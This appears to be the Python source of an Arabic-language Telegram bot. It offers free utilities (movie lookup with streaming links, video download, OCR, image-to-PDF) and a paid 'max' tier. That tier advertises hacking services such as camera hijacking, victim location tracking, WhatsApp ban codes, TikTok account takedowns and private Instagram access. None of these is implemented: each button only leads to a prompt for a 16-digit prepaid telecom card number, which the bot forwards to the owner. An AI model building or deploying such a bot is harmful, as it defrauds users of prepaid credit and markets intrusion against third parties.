import glob
import os
import time
import signal
import sys
import telebot
import shutil
import services
from telebot import apihelper
from telebot import types
from flask import Flask, request
from threading import Thread
from apscheduler.schedulers.background import BackgroundScheduler
import movie_services

# --- 1. الإعدادات ---
apihelper.ENABLE_MIDDLEWARE = True
OWNER_ID = int(os.getenv('OWNER_ID', 0)) 
TOKEN = os.environ.get('TOKEN')
bot = telebot.TeleBot(TOKEN)
user_last_message_time = {}

# --- 2. نظام التريث التلقائي (Middleware) ---
@bot.middleware_handler(update_types=['message', 'callback_query'])
def rate_limit_middleware(update_type, data):
    user_id = data.from_user.id
    if user_id == OWNER_ID: return # المالك دائماً مستثنى
    
    current_time = time.time()
    last_time = user_last_message_time.get(user_id, 0)
    
    if current_time - last_time < 1: # تريث ثانية واحدة
        if update_type == 'message':
            bot.reply_to(data, "⏳ تريث قليلاً!")
        else:
            bot.answer_callback_query(data.id, "⏳ تريث قليلاً!")
        return {"ok": False} # إيقاف التنفيذ
    
    user_last_message_time[user_id] = current_time

# --- 3. التنظيف التلقائي ---
def auto_cleanup_job():
    patterns = ["video_*.mp4", "photo_*.jpg", "*.tmp", "img.jpg", "image.jpg", "output.pdf"]
    count = 0
    for pattern in patterns:
        for f in glob.glob(pattern):
            try: os.remove(f); count += 1
            except: pass
    if count > 0: print(f"🧹 [تنظيف تلقائي]: تم حذف {count} ملف عالق.")

scheduler = BackgroundScheduler()
scheduler.add_job(auto_cleanup_job, 'interval', minutes=1)
scheduler.start()

# --- 4. معالجة الرسائل ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("الاشتراك المجاني", callback_data='free_sub'),
               types.InlineKeyboardButton("اشتراك ماكس ✨", callback_data='max_sub'))
    bot.send_message(message.chat.id, "أهلاً بك في ✨ 𝓜𝓐𝓧 𝓑𝓞𝓞𝓣 ✨", reply_markup=markup)

@bot.message_handler(commands=['storage'])
def check_storage(message):
    if message.from_user.id != OWNER_ID: return
    total, used, free = shutil.disk_usage("/")
    response = (f"📊 حالة ذاكرة تخزين السيرفر:\n💾 الإجمالي: {total // (1024*1024)} MB\n"
                f"📉 المستهلك حالياً: {used // (1024*1024)} MB\n✅ المتبقي: {free // (1024*1024)} MB")
    bot.reply_to(message, response)

@bot.message_handler(func=lambda message: message.text.startswith('/'))
def restrict_commands(message):
    if message.from_user.id == OWNER_ID or message.text == '/start': return
    bot.reply_to(message, "⚠️ نعتذر، أنت تستخدم نصوص غير مصرح بها.")

# --- 5. الدوال والخدمات ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    # الرد على الزر لمنع التكرار والتحميل
    try: bot.answer_callback_query(call.id)
    except: pass

    if call.data == 'free_sub':
        my_free_names = ["شاهد افلامك 🎬", "تحميل أي فيديو ", "ترجمة صورة الى نص", "تحويل صورة لـ PDF"]
        markup = types.InlineKeyboardMarkup(row_width=2)
        buttons = [types.InlineKeyboardButton(my_free_names[i], callback_data=f'f{i+1}') for i in range(4)]
        markup.add(*buttons)
        bot.edit_message_text("اختر الخدمة المجانية:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    
    elif call.data == 'f1':
        msg = bot.send_message(call.message.chat.id, "🎬 **أهلاً بك في سينما البوت!**\n\nأرسل لي الآن اسم الفيلم الذي تود مشاهدته:")
        bot.register_next_step_handler(msg, show_results)
    elif call.data == 'f2':
        msg = bot.send_message(call.message.chat.id, "أرسل لي رابط الفيديو:")
        bot.register_next_step_handler(msg, process_video_link)
    elif call.data == 'f3':
        msg = bot.send_message(call.message.chat.id, "أرسل الصورة التي تريد استخراج النص منها:")
        bot.register_next_step_handler(msg, process_ocr)
    elif call.data == 'f4':
        msg = bot.send_message(call.message.chat.id, "أرسل لي الصورة الآن:")
        bot.register_next_step_handler(msg, process_image_to_pdf)

    elif call.data.startswith("view_"):
        # عدل هذا السطر في دالة callback_query
        PLAYER_DIRECT_URL = "https://vidsrc.pro/embed/movie/{imdb_id}" 

        movie_id = call.data.split("_")[1]
        movie = movie_services.get_movie_full_details(movie_id)
        
        if movie:
            imdb_id = movie.get('imdb_id')
            poster_path = movie.get('poster_path')
            poster = f"https://image.tmdb.org/t/p/w500{poster_path}" if poster_path else "https://via.placeholder.com/500x750?text=No+Image"
            
            text = f"🎞 **{movie.get('title', 'غير معروف')}**\n\n📝 **القصة:** {movie.get('overview', 'لا توجد قصة')}\n⭐ **التقييم:** {movie.get('vote_average')}/10"
            
            markup = types.InlineKeyboardMarkup()
            
            # 2. بناء الرابط والزر هنا
            if imdb_id:
                # دمج الرابط الخاص بك مع الـ ID
                watch_url = f"{PLAYER_DIRECT_URL}{imdb_id}?sub=ar"
                markup.add(types.InlineKeyboardButton("📺 مشاهدة الفيلم (مباشر)", url=watch_url))
            else:
                markup.add(types.InlineKeyboardButton("📺 مشاهدة (بحث)", url=f"https://www.google.com/search?q=watch+{movie.get('title')}"))
            
            # إضافة زر النصيحة
            markup.add(types.InlineKeyboardButton("💡 نصيحة للمشاهدة", callback_data="help_watch"))
            
            try:
                bot.send_photo(call.message.chat.id, poster, caption=text, reply_markup=markup)
            except Exception as e:
                bot.send_message(call.message.chat.id, text, reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "❌ فشل في جلب تفاصيل الفيلم.")



    elif call.data == 'max_sub':
        my_names = [" 💀واتساب 🟡 ", "يوزرات تلي مميزة👑 ", "كود حظر واتس⚡️ ", "اختراق كاميرا📷 ", "معرفة موقع الضحية ","دعس حساب تيكتوك☠️ ", "أرقام فيك ✅ ", "فتح انستا برايفت👀 ", "فك حظر سافيوم994+ ", "كود حظر واتس", "مزايا انستا ✨", "تلغيم رابط🌎 ", "ببجي🎮 ", "رشق انستا✅ ", "تفعيل التطبيقات برو ", " 📱بليلردو لانهائي8 ", "اداة تيكتوك ترول ", "ازالة الاعلانات📢 ", "ارقام مفعلة حقيقيه✅", "تطبيقات ايفون برو "]
        markup = types.InlineKeyboardMarkup(row_width=2)
        buttons = [types.InlineKeyboardButton(my_names[i], callback_data=f'max_{i+1}') for i in range(20)]
        markup.add(*buttons)
        bot.edit_message_text("اختر خدمة ماكس المطلوبة:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    elif call.data.startswith('max_'):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("تفعيل ماكس ✨", callback_data='activate_max'))
        bot.edit_message_text("عذراً، أنت غير مشترك في خطة ماكس ✨", call.message.chat.id, call.message.message_id, reply_markup=markup)
    elif call.data == 'activate_max':
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(types.InlineKeyboardButton("🔴 Asiacell", callback_data='provider_asia'),
                   types.InlineKeyboardButton("🔵 Zain", callback_data='provider_zain'))
        bot.edit_message_text("اختر مزود الخدمة:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    elif call.data.startswith('provider_'):
        provider = "آسياسيل" if call.data == 'provider_asia' else "زين"
        msg = bot.send_message(call.message.chat.id, f"تم اختيار {provider}.\nملاحظة؛رصيد الاشتراك الشهري بطاقة من فئة 5$ .يرجى إرسال رقم البطاقة (16 رقماً):")
        bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))

def show_results(message):
    results = movie_services.get_movie_results(message.text)
    if not results:
        bot.send_message(message.chat.id, "❌ لم يتم العثور على نتائج.")
        return
    markup = types.InlineKeyboardMarkup()
    for movie in results:
        btn_text = f"{movie['title']} ({movie.get('release_date', 'N/A')[:4]})"
        markup.add(types.InlineKeyboardButton(btn_text, callback_data=f"view_{movie['id']}"))
    bot.send_message(message.chat.id, "✅ اختر فيلماً من القائمة:", reply_markup=markup)

def process_video_link(message):
    url, chat_id = message.text.strip(), message.chat.id
    file_name = f"video_{chat_id}.mp4"
    wait_msg = bot.send_message(chat_id, "⏳ جاري التحميل...")
    try:
        services.download_video_service(url, file_name) 
        with open(file_name, 'rb') as video: bot.send_video(chat_id, video)
    except Exception as e: bot.send_message(chat_id, f"⚠️ حدث خطأ: {str(e)}")
    finally:
        try: bot.delete_message(chat_id, wait_msg.message_id)
        except: pass
        if os.path.exists(file_name): os.remove(file_name)

def process_ocr(message):
    if message.content_type == 'photo':
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open("img.jpg", 'wb') as f: f.write(downloaded_file)
        text = services.extract_text_from_image("img.jpg")
        translated = services.translate_text(text)
        bot.send_message(message.chat.id, f"📜 النص المستخرج:\n{text}\n\n🌍 الترجمة:\n{translated}")
        os.remove("img.jpg")
    else:
        bot.reply_to(message, "يرجى إرسال صورة واضحة.")

def process_image_to_pdf(message):
    if message.content_type == 'photo':
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open("image.jpg", 'wb') as new_file:
            new_file.write(downloaded_file)
        services.convert_to_pdf("image.jpg", "output.pdf")
        with open("output.pdf", 'rb') as pdf:
            bot.send_document(message.chat.id, pdf)
        os.remove("image.jpg"); os.remove("output.pdf")
    else:
        bot.reply_to(message, "يرجى إرسال صورة فقط.")

def get_card_number(message, provider):
    if message.text.isdigit() and len(message.text) == 16:
        bot.reply_to(message, "جاري التفعيل..")
        try: bot.send_message(OWNER_ID, f"طلب جديد:\nالمزود: {provider}\nالرقم: {message.text}")
        except: pass
    else:
        msg = bot.reply_to(message, "خطأ: يرجى إرسال 16 رقماً فقط.")
        bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))

# --- 6. التشغيل ---
app = Flask(__name__)

@app.route('/')
def home(): return "البوت يعمل بنظام Webhook!"

@app.route('/ping')
def ping(): return "I am alive!", 200

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return '!', 200
    return 'Forbidden', 403

if __name__ == "__main__":
    WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
    PORT = int(os.environ.get("PORT", 8080))
    if WEBHOOK_URL:
        bot.remove_webhook()
        bot.set_webhook(url=f"{WEBHOOK_URL}/webhook")
        print(f"🚀 البوت يعمل الآن عبر Webhook على المنفذ {PORT}")
        app.run(host='0.0.0.0', port=PORT)
    else:
        print("⚠️ خطأ: لم يتم العثور على WEBHOOK_URL في المتغيرات.")
